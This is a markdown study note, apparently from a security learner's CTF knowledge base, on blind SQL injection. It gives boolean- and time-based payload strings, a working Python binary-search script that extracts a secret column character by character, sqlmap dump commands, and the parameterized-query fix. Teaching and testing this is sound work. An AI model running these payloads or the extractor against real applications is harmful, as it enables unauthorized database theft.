---
topic: web-security
tags: [sql-injection, sqli, blind-sqli, boolean-based, time-based, data-extraction, scripting, sqlmap, owasp-top-10]
sources: [mcdonald-grokking-web-application-security, yaworski-real-world-bug-hunting, ball-hacking-apis]
updated: 2026-09-10
---

# Blind SQL Injection

SQLi when the app shows **no data and no errors** — only an indirect signal.
Hiding the output does not fix the bug: any observable difference is a channel to
extract data one bit per request.

## What makes it "blind"

The query still runs; you just can't see its result. You infer it from a
side-channel:

- **Boolean-based** — the response differs for a true vs false condition
  ("usuario válido" vs "inválido", 200 vs 500, content present vs absent).
- **Time-based** — the response looks identical for true and false, so you make
  the database *pause* on true and measure the delay.

## Boolean-based

Append a condition and read its truth from which response you get. Each request =
one bit.

```
admin' AND '1'='1   -> válido    (TRUE)
admin' AND '1'='2   -> inválido  (FALSE)
```

**Extract data character by character** with `SUBSTR` + comparison. Find the
length first, then each character. Use the char's code (`unicode()` in SQLite,
`ASCII()` in MySQL) with **binary search** — ~7 requests/char instead of ~95:

```
admin' AND length((SELECT flag FROM users WHERE username='admin'))>{n}-- 
admin' AND unicode(substr((SELECT flag FROM users WHERE username='admin'),{i},1))>{mid}-- 
```

Reusable extractor (swap the oracle test and the target subquery):

```python
import urllib.parse, urllib.request
URL="https://TARGET/check"; UA={"User-Agent":"Mozilla/5.0"}
T="(SELECT flag FROM users WHERE username='admin')"      # what to steal
def oracle(cond):                                        # True == condition holds
    q=URL+"?username="+urllib.parse.quote(f"admin' AND {cond}-- ")
    html=urllib.request.urlopen(urllib.request.Request(q,headers=UA),timeout=15).read().decode("utf-8","replace")
    return "usuario válido" in html                      # <-- the app's TRUE signal
def bsearch(expr, lo, hi):
    while lo<hi:
        mid=(lo+hi)//2
        lo,hi=(mid+1,hi) if oracle(f"{expr}>{mid}") else (lo,mid)
    return lo
n=bsearch(f"length({T})",0,128)
print("".join(chr(bsearch(f"unicode(substr({T},{i},1))",32,126)) for i in range(1,n+1)))
```

## Time-based

When true and false look identical, make true *sleep*:

- MySQL: `SLEEP(5)` — `admin' AND IF(<cond>,SLEEP(5),0)-- `
- PostgreSQL: `CASE WHEN <cond> THEN pg_sleep(5) ELSE 0 END`
- SQLite: no sleep; abuse a heavy expression (e.g. `randomblob`/recursive CTE) or
  fall back to boolean.
- MSSQL: `WAITFOR DELAY '0:0:5'`

Measure response time; slow = true. Same char-by-char extraction, timing as the
oracle.

## Automation

Manual blind extraction is hundreds of requests, so `sqlmap` automates it:

```bash
sqlmap -r request.txt -p username --dump          # detect + extract
sqlmap -r request.txt -p username --technique=B   # boolean only  (T = time)
```

(Know the manual method first — it's what sqlmap is doing, and CTFs often need a
tweak sqlmap won't guess.)

## The fix

Same as every SQLi: **parameterized queries**. Suppressing errors and output is
not a fix — the boolean/timing channel still leaks everything.

## Recognising this in a CTF

A check/search that returns only a binary verdict (exists / not, valid / not),
no data, no errors, and reacts to `'` and to `AND 1=1` vs `AND 1=2`. Slug
`sqli-hard` usually means blind. Confirm the oracle, enumerate with count/length
probes, then script the extraction.

## Related

- [SQL injection](sql-injection.md) — fundamentals and auth bypass.
- [UNION-based SQL injection](union-based-sql-injection.md) — when results *are*
  displayed and you can pull data directly.

## Seen in

- SecureAuth (course, Class 2) — a user-checker returning only "válido/inválido";
  confirmed the boolean oracle, enumerated `users` (flag column) via count
  probes, and scripted binary-search extraction of the admin flag. *(Write-up
  kept local until the course releases it.)*

## Sources

Grounded via NotebookLM in the [bibliography](../../books/README.md):

- **McDonald — *Grokking Web Application Security*** — blind inference and the
  parameterized-query fix.
- **Yaworski — *Real-World Bug Hunting*** — blind SQLi findings in practice.
- **Ball — *Hacking APIs*** — boolean/time-based extraction and automation.
